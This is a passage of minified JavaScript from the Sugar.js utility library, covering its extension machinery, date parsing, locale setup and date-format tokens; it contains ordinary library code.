(function(){'use strict';function y(a,b){for(var c in a)if(A(a,c)&&!1===b.call(a,a[c],c,a))break}function Qa(a){function b(a,b,c){t(d,a,function(a,e,f){a=za(a,e,f);vb(d,a.methods,b,c,a.v);return d})}var c="Object"===a,d=Ra(a,!0);b("defineStatic",1);b("defineInstance",2);b("defineInstanceAndStatic",3);b("defineStaticWithArguments",1,!0);b("defineInstanceWithArguments",2,!0);t(d,"defineStaticPolyfill",function(b,c,k){b=za(b,c,k);na(Y[a],b.methods,!0,b.v);return d});t(d,"defineInstancePolyfill",function(b,c,k){b=
    za(b,c,k);na(Y[a].prototype,b.methods,!0,b.v);y(b.methods,function(a,b){oa(d,b,a)});return d});t(d,"alias",function(a,b){var c=d,e="string"===typeof b?d[b]:b;c[a]=e;e.instance&&oa(c,a,e.instance,!0);return d});t(d,"extend",function(b){function e(a,c){var d=b[a];if(d)for(var e=0,f;f=d[e];e++)if(f===c)return!0;return!1}function k(a,c){return b[a]&&!e(a,c)}function l(a,c,d){if(!c[a]||!d)return!1;for(a=0;a<d.length;a++)if(!1===b[d[a]])return!0}var g=Y[a],p=g.prototype,v={},E={};b=b||{};var u=b.methods;
    if(!e("except",g)&&!k("namespaces",g))return c&&"boolean"===typeof b.objectPrototype&&(Aa=b.objectPrototype),y(u||d,function(a,b){u&&(b=a,a=d[b]);!A(a,"instance")||c&&p===p&&(!Aa||"get"===b||"set"===b)||l(b,p,a.flags)||e("except",b)||(E[b]=a.instance);!A(a,"static")||c&&g===p&&(!Aa||"get"===b||"set"===b)||l(b,g,a.flags)||e("except",b)||(v[b]=a)}),na(g,v),na(p,E),u||t(d,"active",!0),d});pa[a]=d;Ta["[object "+a+"]"]=d;Ba(a);wb(d);return r[a]=d}function xb(){return"Sugar"}function vb(a,b,c,d,e){y(b,
    function(b,k){var f=b;d&&(f=Ua(b));e&&(f.flags=e);if(c&2&&!b.instance){var g=d?Ua(b,!0):yb(b);t(f,"instance",g)}c&1&&t(f,"static",!0);g=f;a[k]=g;g.instance&&oa(a,k,g.instance,!0);a.active&&a.extend(k)})}function za(a,b,c){if("string"===typeof a){var d={};d[a]=b;a=c}else d=a,a=b;return{v:a,methods:d}}function Ua(a,b){var c=a.length-1-(b?1:0);return function(){var d=[],e=[];b&&d.push(this);var f=Math.max(arguments.length,c);for(var k=0;k<f;k++)k<c?d.push(arguments[k]):e.push(arguments[k]);d.push(e);
    return a.apply(this,d)}}function yb(a){switch(a.length){case 0:case 1:return function(){return a(this)};case 2:return function(b){return a(this,b)};case 3:return function(b,c){return a(this,b,c)};case 4:return function(b,c,d){return a(this,b,c,d)};case 5:return function(b,c,d,e){return a(this,b,c,d,e)}}}function na(a,b,c,d){y(b,function(b,f){c&&!d&&a[f]||t(a,f,b)})}function Ra(a){function b(a,d){if(!(this instanceof b))return new b(a,d);this.constructor!==b&&(a=this.constructor.apply(a,arguments));
    this.raw=a}t(b,"toString",function(){return"Sugar"+a});t(b.prototype,"valueOf",function(){return this.raw});return b}function oa(a,b,c){c=zb(c);var d;var e=Va.prototype;var f=(d=e[b])&&d!==Object.prototype[b];d&&d.K||(e[b]=f?Ab(b):c);a.prototype[b]=c;a===r.Object&&Bb(b,c)}function wb(a){y(r.Object&&r.Object.prototype,function(b,c){if("function"===typeof b){var d=a.prototype;A(d,c)||(d[c]=b)}})}function Bb(a,b){y(pa,function(c){c=c.prototype;A(c,a)||(c[a]=b)})}function zb(a){return function(){return new Va(a.apply(this.raw,
    arguments))}}function Ab(a){function b(){var b=this.raw,d;null!=b&&(d=Ta[qa(b)]);d||(d=r.Object);return(new d(b))[a].apply(this,arguments)}b.K=!0;return b}function Ba(a,b){var c=pa[a],d=Y[a].prototype;!b&&Wa&&(b=Wa(d));y(b,function(a){if("constructor"!==a&&"valueOf"!==a&&"__proto__"!==a){try{var b=d[a];if("function"!==typeof b)return}catch(k){return}oa(c,a,b)}})}function Cb(a,b,c){a[b]=c.value}function t(a,b,c,d){Ca(a,b,{value:c,enumerable:!!d,configurable:!0,writable:!0})}function qa(a){return Db.call(a)}
    function A(a,b){return!!a&&Eb.call(a,b)}function n(a,b){if(A(a,b))return a[b]}function Da(a,b,c){c||(c=qa(a));return c==="[object "+b+"]"}function Ea(a){return function(b,c,d){b[a](c,d)}}function Fa(a,b,c,d){Xa(a,Fb(b,c),d)}function Fb(a,b){var c={};K(a)&&(a=a.split(" "));F(a,function(a,e){b(c,a,e)});return c}function Gb(a,b,c){t(a,b,c)}function m(a){return void 0!==a}function N(a){return void 0===a}function Ga(a,b){if(A(a,b))return b}function L(a,b){y(b,function(b,d){a[d]=b});return a}function Hb(a,
    b,c,d){var e=[],f;for(f in a)f>>>0==f&&4294967295!=f&&(c||(d?f<=b:f>=b))&&e.push(+f);e.sort(function(a,c){var d=a>b;return d!==c>b?d?-1:1:a-c});return e}function F(a,b){for(var c=0,d=a.length;c<d;c++){if(!(c in a)){d=a;for(var e=b,f=Hb(d,c,void 0),k=0,l=f.length;k<l;k++)c=f[k],e.call(d,d[c],c,d);return d}b(a[c],c)}}function Ib(a,b){for(var c=[],d=0,e=a.length;d<e;d++){var f=a[d];d in a&&b(f,d)&&c.push(f)}return c}function ra(a,b){for(var c=[],d=0,e=a.length;d<e;d++)d in a&&c.push(b(a[d],d));return c}
    function sa(a,b,c,d,e){d=Z(a).toString(d||10);e=e||"0";b-=d.replace(/\.\d+/,"").length;var f="";for(e=e.toString();0<b;)if(b&1&&(f+=e),b>>=1)e+=e;d=f+d;if(c||0>a)d=(0>a?"-":"+")+d;return d}function Jb(a){if(11<=a&&13>=a)return"th";switch(a%10){case 1:return"st";case 2:return"nd";case 3:return"rd";default:return"th"}}function Kb(a,b,c){function d(d,e){var g=e[2],p=e[3],v=e[5];if(e[4]&&b){var l=v;var E=b}else if(g)l=g,E=a;else var q=p&&b?p:e[1]||e[0];if(E){k(c,g,v);var h=function(a,b){return E(a,l,
    b)}}d.push(h||f(q))}function e(a,b,c,d){if(d>c){var e=b.slice(c,d);l(e,"{");l(e,"}");a.push(function(){return e})}}function f(a){return function(){return a}}function k(a,b,c){if(a&&!a(b,c))throw new TypeError("Invalid token "+(b||c)+" in format string");}function l(a,b){if(-1!==a.indexOf(b))throw new TypeError("Unmatched "+b+" in format string");}var g=Lb,p=Mb(function(a){var b=[],c=0,f;for(g.lastIndex=0;f=g.exec(a);)e(b,a,c,f.index),d(b,f),c=g.lastIndex;e(b,a,c,a.length);return b});return function(a,
    b,c){a=p(a);for(var d="",e=0;e<a.length;e++)d+=a[e](b,c);return d}}function Nb(a){K(a)||(a=String(a));return a.replace(/([\\\/'*+?|()\[\]{}.^$-])/g,"\\$1")}function B(a,b){return a["get"+(C(a)?"UTC":"")+b]()}function aa(a,b,c,d){if(!d||c!==B(a,b,c))a["set"+(C(a)?"UTC":"")+b](c)}function Mb(a){var b={},c=0;return function(d){if(A(b,d))return b[d];c===Ob&&(b={},c=0);c++;return b[d]=a(d)}}function V(){return Pb("newDateInternal")()}function R(a){var b=new Date(a.getTime());C(b,!!C(a));return b}function Ya(a){if(isNaN(a.getTime()))throw new TypeError("Date is not valid");
    }function x(a){return B(a,"Day")}function M(a){return B(a,"Date")}function H(a){return B(a,"Month")}function O(a){return B(a,"FullYear")}function P(a,b){aa(a,"Date",b)}function Za(a){return 32-B(new Date(O(a),H(a),32),"Date")}function S(a,b,c){if(Q(b)){var d=x(a);if(c){c=0<c?1:-1;var e=b%7-d;e&&e/Z(e)!==c&&(b+=7*c)}P(a,M(a)+b-d);return a.getTime()}}function Ha(a,b){var c=C(a)?0:a.getTimezoneOffset();var d=!0===b?":":"";if(!c&&b)return"Z";var e=sa(ba(-c/60),2,!0);c=sa(Z(c%60),2);return e+d+c}function $a(a,
    b){var c=a[0],d=a[1];if(b&&K(c)){var e={};if(c=c.match(/^(-?\d*[\d.]\d*)?\s?(\w+?)s?$/i)){if(N(f)){var f=+c[1];isNaN(f)&&(f=1)}e[c[2].toLowerCase()]=f}c=e}else Q(c)&&Q(d)?(c=Qb(a),d=null):c&&"object"===typeof c&&(c=L({},c));return[c,d]}function Qb(a){var b={},c=0;ab(7,function(d){var e=a[c++];m(e)&&(b[d.name]=e)});return b}function Ia(a,b,c){c=c||0;for(N(b)&&(b=7);b>=c&&!1!==a(T[b],b);b--);}function ab(a,b){for(;0<=a&&!1!==b(T[a],a);)a=fa(a)}function fa(a){return 6===a?4:5===a?3:a-1}function ta(a,
    b,c,d){Ia(function(c,d){var e=c.name;var f=n(a,Ja(a,e));m(f)&&b(e,f,c,d);e=void 0;!1!==e&&4===d&&(e=n(a,Ja(a,"weekday")),m(e)&&b("weekday",e,c,d),e=void 0);return e},c,d)}function Rb(a,b){ta(a,b,7,4)}function ha(a,b,c,d){var e={};e[b]=c;return U(a,e,d,1)}function bb(a,b,c){b=$a(b,!0);return U(a,b[0],b[1],c)}function ia(a,b){S(a,7*cb((x(a)-b)/7)+b);return a}function db(a,b){var c=b-1;S(a,7*Ka((x(a)-c)/7)+c);return a}function ja(a,b,c){5===b&&ia(a,w.get(c).s());return I(a,fa(b))}function ua(a,b,c,d){5===
    b&&db(a,w.get(c).s());return I(a,fa(b),d,!0)}function I(a,b,c,d){ab(b,function(b,f){var e=d?b.end:b.start;va(e)&&(e=e(a));aa(a,b.method,e);return!m(c)||f>c});return a}function Ja(a,b){return Ga(a,b)||Ga(a,b+"s")||"day"===b&&Ga(a,"date")}function Sb(a){var b={},c;b[a]=1;ta(b,function(a,b,f,k){c=k;return!1});return c}function wa(a,b,c){var d=b>a;if(!d){var e=b;b=a;a=e}e=b-a;1<c.h&&(e=ba(e/c.h));if(c.m)for(a=R(a),e&&ha(a,c.name,e);a<b;){ha(a,c.name,1);if(a>b)break;e+=1}return d?-e:e}function eb(a,b){if(Q(b)){var c=
    R(a),d=x(a);I(c,6);P(c,4);ia(c,1);P(c,M(c)+7*(b-1));var e=O(c);aa(a,"FullYear",e);e=H(c);aa(a,"Month",e);P(a,M(c));S(a,d||7)}return a.getTime()}function ca(a,b,c,d){var e,f=0;N(c)&&(c=1);N(d)&&(d=4);var k=e=db(R(a),c),l=c,g=d;I(k,6);P(k,g);ia(k,l);b&&a<e&&(b=e=ia(R(a),c),I(b,6),P(b,d),ia(b,c));for(;e<=a;)P(e,M(e)+7),f++;return f}function fb(a,b,c){var d=O(a);var e=H(a);if(0===e||11===e){if(!c){c=w.get(b);var f=c.s(b);var k=c.D(b)}a=ca(a,!1,f,k);0===e&&0===a?--d:11===e&&1===a&&(d+=1)}return d}function gb(a,
    b,c,d){var e;Ya(a);va(c)?d=c:e=c;c=Tb(a,b);if(d&&(d=d.apply(a,c.concat(w.get(e)))))return hb(a,d,e);0===c[1]&&(c[1]=1,c[0]=1);a=b?"duration":0<c[2]?"future":"past";return w.get(e).P(c,a)}function Ub(a,b){var c=0,d=0;Ia(function(a,f){d=Z(b(a));if(1<=d)return c=f,!1});return[d,c,a]}function Tb(a,b){b||(b=V(),a>b&&(b=new Date(b.getTime()-10)));return Ub(a-b,function(c){return Z(wa(a,b,c))})}function hb(a,b,c){Ya(a);b=ib[b]||b||"{long}";return xa(b,a,c)}function La(a,b){var c=B(a,"Hours");return w.get(b).ampm[ba(c/
    12)]||""}function jb(a,b,c){var d;if(!isNaN(a.getTime())){if(K(b))switch(b=b.trim().toLowerCase(),!0){case "future"===b:return a.getTime()>V().getTime();case "past"===b:return a.getTime()<V().getTime();case "today"===b:return Ma(a);case "tomorrow"===b:return Ma(a,1);case "yesterday"===b:return Ma(a,-1);case "weekday"===b:return 0<x(a)&&6>x(a);case "weekend"===b:return 0===x(a)||6===x(a);case m(d=W.weekdayMap[b]):return x(a)===d;case m(d=W.monthMap[b]):return H(a)===d}return kb(a,b,c)}}function kb(a,
    b,c,d,e){var f=0,k=0;C(a)&&(e=e||{},e.fromUTC=!0,e.setUTC=!0);b=ka(null,b,e,!0);if(0<c){f=k=c;var l=!0}if(isNaN(b.date.getTime()))return!1;if(b.set&&b.set.specificity){if(m(b.set.edge)||m(b.set.shift)){var g=!0;ja(b.date,b.set.specificity,d)}if(g||6===b.set.specificity)var p=ua(R(b.date),b.set.specificity,d).getTime();else p=T[b.set.specificity],p=ha(R(b.date),p.name,1).getTime()-1;!l&&m(b.set.sign)&&b.set.specificity&&(f=50,k=-50)}c=a.getTime();l=b.date.getTime();p=p||l;if(a=b.set&&b.set.specificity?
    0:6E4*(b.date.getTimezoneOffset()-a.getTimezoneOffset()))l-=a,p-=a;return c>=l-f&&c<=p+k}function Ma(a,b){var c=V();b&&P(c,M(c)+b);return O(a)===O(c)&&H(a)===H(c)&&M(a)===M(c)}function X(a,b,c){return ka(null,a,b,c).date}function ka(a,b,c,d){function e(a,b){var c=n(z,"params")||{};F(b.to,function(b,d){var e=a[d+1];if(e){if("yy"===b||"y"===b){b="year";var f=n(z,"prefer");e=+e;e+=50>e?2E3:1900;if(f){var g=e-O(q);g/Z(g)!==f&&(e+=100*f)}}else(f=n(Na,b))?(b=f.g||b,g=f.B?f.B:f.sign?"+"===e?1:-1:f.U?!!g:
    +e.replace(/,/,"."),"month"===f.g&&--g,e=g):e=u.R(b,e);c[b]=e}});return c}function f(a,b){C(a)&&!m(n(z,"fromUTC"))&&(z.fromUTC=!0);C(a)&&!m(n(z,"setUTC"))&&(z.setUTC=!0);b&&(a=new Date(a.getTime()));return a}function k(){F(t,function(a){a.call()})}function l(a){a=a.toLowerCase();u=w.get(n(z,"locale"));for(var b=0,c,d;c=u.compiledFormats[b];b++)if(d=a.match(c.reg)){u.I(c,b);h=e(d,c);if(m(h.timestamp)){a=h.timestamp;h=null;break}m(h.ampm)&&(b=h.ampm,1===b&&12>h.hour?h.hour+=12:0===b&&12===h.hour&&(h.hour=
    0));if(h.utc||m(h.tzHour))if(b=h.tzHour,c=h.tzMinute,d=h.tzSign,C(q,!0),b=(d||1)*(60*(b||0)+(c||0)))h.minute=(h.minute||0)-b;m(h.shift)&&N(h.unit)&&(m(h.month)?h.unit=7:m(h.weekday)&&(h.unit=5));m(h.num)&&N(h.unit)&&(m(h.weekday)?v(h.num):m(h.month)&&(h.date=h.num));h.midday&&g(h.midday);m(h.day)&&(I(q,3),N(h.unit)&&(h.unit=4,h.num=h.day,delete h.day));m(h.unit)&&(b=h.unit,c=m(h.num)?h.num:1,m(h.weekday)&&(6===b?(v(c),c=1):(U(q,{weekday:h.weekday},!0),delete h.weekday)),h.half&&(c*=h.half),m(h.shift)?
    c*=h.shift:h.sign&&(c*=h.sign),m(h.day)&&(c+=h.day,delete h.day),E(b),h[W.units[b]]=c,Sa=!0);h.edge&&p(h.edge,h);h.yearSign&&(h.year*=h.yearSign);break}h?Sa?U(q,h,!1,1):(C(q)&&I(q,3),U(q,h,!0,0,n(z,"prefer"),r)):(q=new Date(a),n(z,"fromUTC")&&q.setTime(q.getTime()+6E4*q.getTimezoneOffset()));k();return q}function g(a){h.hour=a%24;23<a&&t.push(function(){ha(q,"date",ba(a/24))})}function p(a,b){var c=b.unit;c||Rb(b,function(a,d,e,f){"weekday"===a&&m(b.month)||(c=f)});if(6===c&&m(b.weekday)){var d=b.weekday;
    delete b.weekday}t.push(function(){if(0>a)ja(q,c,n(z,"locale"));else if(0<a){if(1===a){var b=4;ja(q,4)}ua(q,c,n(z,"locale"),b)}m(d)&&(S(q,d,-a),I(q,3))});b.specificity=6===c?4:c-1}function v(a){h.weekday=7*(a-1)+h.weekday;r=h.date=1}function E(a){var b;ta(h,function(c,d,e,f){if(f>=a)return q.setTime(NaN),!1;f<a&&(b=b||{},b[c]=d,delete h[Ja(h,c)])});b&&(t.push(function(){U(q,b,!0,!1,n(z,"prefer"),r)}),h.edge&&(p(h.edge,b),delete h.edge))}var u,Sa,r;var t=[];var z=function(a){a=K(a)?{locale:a}:a||{};
    a.prefer=+!!n(a,"future")-+!!n(a,"past");return a}(c);var q=a&&b?f(a,!0):V();C(q,n(z,"fromUTC"));if(K(b))q=l(b);else if(la(b))q=f(b,A(z,"clone")||d);else if(b&&"object"===typeof b){var h=L({},b);U(q,h,!0)}else(Q(b)||null===b)&&q.setTime(b);C(q,!!n(z,"setUTC"));return{set:h,date:q}}function U(a,b,c,d,e,f){function k(){var a=T[g];d=e;l(a.name,1,a,g)}function l(c,v,k,l){var p=k.method,E;e&&!g&&(g="weekday"===c?5:4===l?6:l+1);l>b.specificity||(b.specificity=l);if(E=v%1){if(l){var u=T[fa(l)];E=Vb(k.h/
    u.h*E);b[u.name]=E}v=ba(v)}if("weekday"===c)d||S(a,v,f);else if(c=6===l&&28<M(a),d&&!k.m)a.setTime(a.getTime()+v*d*k.h);else{d&&(5===l&&(v*=7,p=T[4].method),v=v*d+B(a,p));k=p;l=v;p=d;"ISOWeek"===k?eb(a,l):aa(a,k,l,p);if(k=c)0>v&&(v=v%12+12),k=v%12!==H(a);k&&P(a,0)}}var g;if(Q(b)&&d)b={millisecond:b};else if(Q(b))return a.setTime(b),a;ta(b,l);c&&b.specificity&&I(a,fa(b.specificity));a:{if(g&&!(7<g))switch(e){case -1:c=a>V();break a;case 1:c=a<V();break a}c=void 0}c&&k();return a}function ya(a){var b=
    a.join("");return a&&a.length?b.length===a.length?"["+b+"]":ra(a,Nb).join("|"):""}function J(a,b){1<a.length&&(a="(?:"+a+")");b&&(a+="?");return a}function Wb(a,b,c){a=lb[a];return b=a.w?J(b+J(c)):a.H?b+J(a.H+"|"+c):b+J(c,!0)}function mb(a,b,c,d){var e;1<c&&(e=a[b+(c-1)*d]);return e||a[b]}function nb(a){function b(a){this.S(a)}b.prototype={F:function(a,b){return this.monthSuffix?a+1+this.monthSuffix:mb(this.months,a,b,12)},G:function(a,b){return mb(this.weekdays,a,b,7)},R:function(a,b){var c=this[a+
    "Map"],d;c&&(d=c[b]);N(d)&&(d=this.M(b),"month"===a&&--d);return d},M:function(a){var b=this.numeralMap[a];if(m(b))return b;b=+a.replace(/,/,".");if(!isNaN(b))return b;b=this.N(a);isNaN(b)||(this.numeralMap[a]=b);return b},N:function(a){var b=1,c=0,f;var k=a.split("");for(var l=k.length-1;f=k[l];l--){a=n(this.numeralMap,f);N(a)&&(a=n(da,f)||0);(f=0<a&&0===a%10)?(g&&(c+=b),l?b=a:c+=a):(c+=a*b,b*=10);var g=f}return c},O:function(a){return this.ordinalSuffix||Jb(a)},P:function(a,b){return this.J(a,b)},
    s:function(){var a=this.firstDayOfWeek;return m(a)?a:1},D:function(){return this.firstDayOfWeekYear||4},J:function(a,b){var c=a[0],d=a[1],k=a[2],l=this[b]||this.relative;if(va(l))return l.call(this,c,d,k,b);var g=this.units[8*(this.plural&&1!==c?1:0)+d]||this.units[d];var p=this[0<k?"fromNow":"ago"];return l.replace(/\{(.*?)\}/g,function(a,b){switch(b){case "num":return c;case "unit":return g;case "sign":return p}})},I:function(a,b){this.compiledFormats.splice(b,1);this.compiledFormats.unshift(a)},
    addFormat:function(a,b){function c(a){var c,e=a.match(/\?$/),f=a.match(/^(\d+)\??$/),l=a.match(/(\d)(?:-(\d))?/),u=a.replace(/[^a-z]+$/i,"");if(c=n(k.parsingAliases,u))return a=d(c),e&&(a=J(a,!0)),a;if(f)a=k.tokens[f[1]];else if(c=n(Na,u))a=c.src;else if(c=n(k.parsingTokens,u)||n(k,u),u=u.replace(/s$/,""),c||(c=n(k.parsingTokens,u)||n(k,u+"s")),K(c)){a=c;var m=k[u+"Suffix"]}else l&&(c=Ib(c,function(a,b){var d=b%(k.units?8:c.length);return d>=l[1]&&d<=(l[2]||l[1])})),a=ya(c);if(!a)return"";f?a=J(a):
    (b.push(u),a="("+a+")");m&&(a=Wb(u,a,m));e&&(a+="?");return a}function d(a){a=a.replace(/ /g," ?");return a.replace(/\{([^,]+?)\}/g,function(a,b){var d=b.split("|");return 1<d.length?J(ra(d,c).join("|")):c(b)})}var k=this;b||(b=[],a=d(a));k.addRawFormat(a,b)},addRawFormat:function(a,b){this.compiledFormats.unshift({reg:RegExp("^ *"+a+" *$","i"),to:b})},S:function(a){function b(a,b,d,e){var f=a,p=[];g[f]||(f+="s");if(!d){d={};var k=!0}c(f,function(a,c,f){c=c*b+f;f=e?e(f):f;d[a]=f;d[a.toLowerCase()]=
    f;p[c]=a});g[f]=p;k&&(g[a+"Map"]=d)}function c(a,b){F(g[a],function(a,c){f(a,function(a,d){b(a,d,c)})})}function f(a,b){var c=ra(a.split("+"),function(a){return a.replace(/(.+):(.+)$/,function(a,b,c){return ra(c.split("|"),function(a){return b+a}).join("|")})}).join("|");F(c.split("|"),b)}function k(a,b,c){F(g[a],function(a){b&&(a=c?J("{time}[,\\s\\u3000]",!0)+a:a+l());g.addFormat(a)})}function l(){var a=",?[\\s\\u3000]",b;(b=ya(g.timeMarkers))&&(a+="| (?:"+b+") ");a=J(a,g.timeMarkerOptional);return J(a+
    "{time}",!0)}var g=this;g.compiledFormats=[];g.parsingAliases={};g.parsingTokens={};L(g,a);(function(){F(Xb,function(a){var b=g[a];K(b)?g[a]=b.split(","):b||(g[a]=[])})})();b("month",12);b("weekday",7);b("unit",8);b("ampm",2);(function(){var a={};b("numeral",10,a);b("article",1,a,function(){return 1});b("placeholder",4,a,function(a){return Yb(10,a+1)});g.numeralMap=a})();g.parsingAliases.time=g.ampmFront?"{ampm?} {hour} (?:{minute} (?::?{second})?)?":g.ampm.length?"{hour}(?:[.:]{minute}(?:[.:]{second})? {ampm?}| {ampm})":
    "{hour}(?:[.:]{minute}(?:[.:]{second})?)";g.parsingAliases.tzOffset="(?:{Z}|{GMT?}(?:{tzSign}{tzHour}(?::?{tzMinute}(?: \\([\\w\\s]+\\))?)?)?)?";(function(){y(lb,function(a,b){var c=a.j?Na[a.j].src:a.src;if(a.T||g.numeralUnits){var d="";var e=g.numerals.concat(g.placeholders).concat(g.articles);g.allowsFullWidth&&(e=e.concat(ob.split("")));e.length&&(d="|(?:"+ya(e)+")+");c+=d}(e=g[b+"s"])&&e.length&&(c+="|"+ya(e));g.parsingTokens[b]=c})})();(function(){Ia(function(a,b){var c=g.timeSuffixes[b];c&&
    (g[(a.alias||a.name)+"Suffix"]=c)})})();(function(){F(g.modifiers,function(a){var b=a.name,c=b+"Map";var d=g[c]||{};f(a.src,function(c,e){var f=n(g.parsingTokens,b),k=a.value;d[c]=k;g.parsingTokens[b]=f?f+"|"+c:c;"sign"===a.name&&0===e&&(g[1===k?"fromNow":"ago"]=c)});g[c]=d})})();(function(){F(Zb,function(a){var b=a.src;a.mdy&&g.mdy&&(b=a.mdy);a.time?(g.addFormat(J("{time}[,\\s\\u3000]",!0)+b),g.addFormat(b+l())):g.addFormat(b)});g.addFormat("{time}")})();k("parse");k("timeParse",!0);k("timeFrontParse",
    !0,!0)}};return new b(a)}function Oa(a,b){this.start=pb(a);this.end=pb(b)}function pb(a){return la(a)?new Date(a.getTime()):null==a?a:la(a)?a.getTime():a.valueOf()}function ea(a){return la(a)?a:null==a?new Date:G.create?G.create(a):new Date(a)}var r,Y="undefined"!==typeof global&&global.Object===Object?global:this,$b="undefined"!==typeof module&&module.L,Aa=!1,pa={},Ta={},Ca=Object.defineProperty&&Object.defineProperties?Object.defineProperty:Cb,Va=Ra("Chainable"),Wa=Object.getOwnPropertyNames,Db=
    Object.prototype.toString,Eb=Object.prototype.hasOwnProperty;(function(){r=Y.Sugar;if(!r){r=function(a){y(r,function(b,c){A(pa,c)&&b.extend(a)});return r};if($b)module.L=r;else try{Y.Sugar=r}catch(a){}y("Object Number String Array Date RegExp Function".split(" "),function(a){Qa(a)});t(r,"extend",r);t(r,"toString",xb);t(r,"createNamespace",Qa);t(r,"util",{hasOwn:A,getOwn:n,setProperty:t,classToString:qa,defineProperty:Ca,forEachProperty:y,mapNativeToChainable:Ba})}})();var Lb=/([{}])\1|\{([^}]*)\}|(%)%|(%(\w*))/g,
    G=r.Date;A=r.util.hasOwn;n=r.util.getOwn;t=r.util.setProperty;qa=r.util.classToString;Ca=r.util.defineProperty;y=r.util.forEachProperty;Ba=r.util.mapNativeToChainable;var Q,K,la,va,qb=Ea("defineStatic"),Xa=Ea("defineInstance"),ac=Ea("defineInstanceWithArguments"),ba=Math.trunc||function(a){return 0!==a&&isFinite(a)?0>a?Ka(a):cb(a):a},da,ob,Z=Math.abs,Yb=Math.pow,bc=Math.min,cc=Math.max,Ka=Math.ceil,cb=Math.floor,Vb=Math.round,rb=String.fromCharCode,C=function(a){var b="_sugar_"+a;return function(a,
    d){return 1<arguments.length?(t(a,b,d),a):a[b]}}("utc"),Ob=1E3;(function(){function a(a,d){return d&&Da(new d,"Object")?b(d):c(a)}function b(a){var b=String(a);return function(a){return String(a.constructor)===b}}function c(a){return function(b,c){return Da(b,a,c)}}function d(a){var b=a.toLowerCase();return function(c){var d=typeof c;return d===b||"object"===d&&Da(c,a)}}(function(){var b="Boolean Number String Date RegExp Function Array Error Set Map".split(" ");Q=d(b[1]);K=d(b[2]);la=a(b[3]);a(b[4]);
    va=a(b[5]);Array.isArray||a(b[6]);a(b[7]);a(b[8],"undefined"!==typeof Set&&Set);a(b[9],"undefined"!==typeof Map&&Map)})();(function(){F("Int8 Uint8 Uint8Clamped Int16 Uint16 Int32 Uint32 Float32 Float64".split(" "),function(){})})()})();(function(){var a="";da={};for(var b=0,c;9>=b;b++)c=rb(b+65296),a+=c,da[c]=rb(b+48);da[","]="";da["\uff0e"]=".";da["."]=".";ob=a})();var Xb="months weekdays units numerals placeholders articles tokens timeMarkers ampm timeSuffixes parse timeParse timeFrontParse modifiers".split(" "),
    dc=/(\w{3})[()\s\d]*$/,Na={yyyy:{g:"year",src:"\\d{4}"},MM:{g:"month",src:"[01]?\\d"},dd:{g:"date",src:"[0123]?\\d"},hh:{g:"hour",src:"[0-2]?\\d"},mm:{g:"minute",src:"[0-5]\\d"},ss:{g:"second",src:"[0-5]\\d(?:[,.]\\d+)?"},yy:{g:"year",src:"\\d{2}"},y:{g:"year",src:"\\d"},yearSign:{src:"[+-]",sign:!0},tzHour:{src:"[0-1]\\d"},tzMinute:{src:"[0-5]\\d"},tzSign:{src:"[+\u2212-]",sign:!0},ihh:{g:"hour",src:"[0-2]?\\d(?:[,.]\\d+)?"},imm:{g:"minute",src:"[0-5]\\d(?:[,.]\\d+)?"},GMT:{g:"utc",src:"GMT",B:1},
    Z:{g:"utc",src:"Z",B:1},timestamp:{src:"\\d+"}},lb={year:{j:"yyyy",w:!0},month:{j:"MM",w:!0},date:{j:"dd",w:!0},hour:{j:"hh",H:":"},minute:{j:"mm"},second:{j:"ss"},num:{src:"\\d+",T:!0}},Zb=[{src:"{MM}[-.\\/]{yyyy}"},{time:!0,src:"{dd}[-.\\/]{MM}(?:[-.\\/]{yyyy|yy|y})?",mdy:"{MM}[-.\\/]{dd}(?:[-.\\/]{yyyy|yy|y})?"},{time:!0,src:"{yyyy}[-.\\/]{MM}(?:[-.\\/]{dd})?"},{src:"\\\\/Date\\({timestamp}(?:[+-]\\d{4,4})?\\)\\\\/"},{src:"{yearSign?}{yyyy}(?:-?{MM}(?:-?{dd}(?:T{ihh}(?::?{imm}(?::?{ss})?)?)?)?)?{tzOffset?}"}],
    ib={ISO8601:"{yyyy}-{MM}-{dd}T{HH}:{mm}:{ss}.{SSS}{Z}",RFC1123:"{Dow}, {dd} {Mon} {yyyy} {HH}:{mm}:{ss} {ZZ}",RFC1036:"{Weekday}, {dd}-{Mon}-{yy} {HH}:{mm}:{ss} {ZZ}"},ec=[{b:"Dow",a:"a",i:"dow",get:function(a,b){return w.get(b).G(x(a),2)}},{b:"Weekday",a:"A",i:"weekday",C:!0,get:function(a,b,c){return w.get(b).G(x(a),c)}},{b:"Mon",a:"b h",i:"mon",get:function(a,b){return w.get(b).F(H(a),2)}},{b:"Month",a:"B",i:"month",C:!0,get:function(a,b,c){return w.get(b).F(H(a),c)}},{a:"C",get:function(a){return O(a).toString().slice(0,
    2)}},{b:"d date day",a:"d",f:2,c:"dd",l:"do",get:function(a){return M(a)}},{a:"e",get:function(a){return sa(M(a),2,!1,10," ")}},{b:"H 24hr",a:"H",f:2,c:"HH",get:function(a){return B(a,"Hours")}},{b:"h hours 12hr",a:"I",f:2,c:"hh",get:function(a){return B(a,"Hours")%12||12}},{b:"D",a:"j",f:3,c:"DDD",get:function(a){var b=I(R(a),6);return wa(a,b,T[4])+1}},{b:"M",a:"m",f:2,l:"Mo",c:"MM",get:function(a){return H(a)+1}},{b:"m minutes",a:"M",f:2,c:"mm",get:function(a){return B(a,"Minutes")}},{b:"Q",get:function(a){return Ka((H(a)+
    1)/3)}},{b:"TT",a:"p",get:function(a,b){return La(a,b)}},{b:"tt",a:"P",get:function(a,b){return La(a,b).toLowerCase()}},{b:"T",i:"t",get:function(a,b){return La(a,b).charAt(0)}},{b:"s seconds",a:"S",f:2,c:"ss",get:function(a){return B(a,"Seconds")}},{b:"S ms",f:3,c:"SSS",get:function(a){return B(a,"Milliseconds")}},{b:"e",a:"u",l:"eo",get:function(a){return x(a)||7}},{a:"U",f:2,get:function(a){return ca(a,!1,0)}},{b:"W",a:"V",f:2,l:"Wo",c:"WW",get:function(a){return ca(a,!0)}},{a:"w",get:function(a){return x(a)}},
